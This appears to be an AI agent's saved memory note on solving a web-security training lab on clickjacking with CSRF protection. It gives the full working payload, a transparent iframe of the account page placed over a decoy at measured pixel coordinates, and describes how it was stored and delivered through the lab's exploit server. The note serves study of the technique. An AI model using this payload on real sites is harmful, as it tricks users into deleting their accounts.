---
metadata:
  node_type: memory
name: "Clickjacking lab basic-csrf-protected arm A"
description: "Basic clickjacking with CSRF token protection solved by measuring the delete-button rect and overlaying a decoy at those exact pixels"
last_updated: 2026-10-10T21:10:54+08:00
created: 2026-10-10T21:10:54+08:00
---

Lab: /web-security/clickjacking/lab-basic-csrf-protected (Basic clickjacking with CSRF token protection). Result: solved, banner is-solved + "Congratulations, you solved the lab!" (banner_verdict on the instance root).

Path that worked
1. page_read of the academy page gave widget-lab-id (solutions stripped) - no separate number fetch needed.
2. range_launch launch-url /web-security/clickjacking/lab-basic-csrf-protected --jar /tmp/cj1.json -> fresh instance (reused:false).
3. Exploit-server URL is JS-rendered; page_read strips it. browser_suite goto instance root then eval [...document.querySelectorAll('a')].map(a=>a.href).filter(h=>/exploit/i.test(h)) returned https://exploit-<id>.exploit-server.net/ (the login page HTML also carries it as a#exploit-link - cheaper).
4. Login: GET /login for csrf, POST /login csrf+username+password -> session cookie in jar.
5. Geometry instead of guessing the classic 485/80 numbers: browser viewport was ~780px (clientWidth 765), the framed #delete-account-form button sits at x=16, y=492.27, 167.7x33. Because the iframe width is fixed in the payload, the layout inside is independent of the victim window size - so measuring at the iframe width and placing the decoy at the measured pixels is deterministic.
6. Payload stored on the exploit server (POST / fields urlIsHttps=on responseFile=/exploit responseHead=... responseBody=... formAction=STORE):
   style: iframe{position:relative;width:780px;height:700px;opacity:0.0001;z-index:2;} div{position:absolute;top:492px;left:16px;z-index:1;}
   body: <div>Click me</div><iframe src="https://INSTANCE/my-account"></iframe>
7. Delivery: same POST with formAction=DELIVER_TO_VICTIM --follow; the followed GET / already carried is-solved.

Notes
- CSRF protection is irrelevant to clickjacking: the framed real page submits its own token on the victim click.
- Emulation.setDeviceMetricsOverride (via browser_suite call) did NOT shrink the viewport (clientWidth stayed 765) - do not rely on it for geometry; measure at the natural width and pin the iframe to that width.
- The exploit-server form field is responseBody/responseHead/responseFile, not exploitServerBody (that name is from older notes).
- Deliver POST must repeat responseHead+responseBody and must be followed (--follow), otherwise the victim is not summoned.

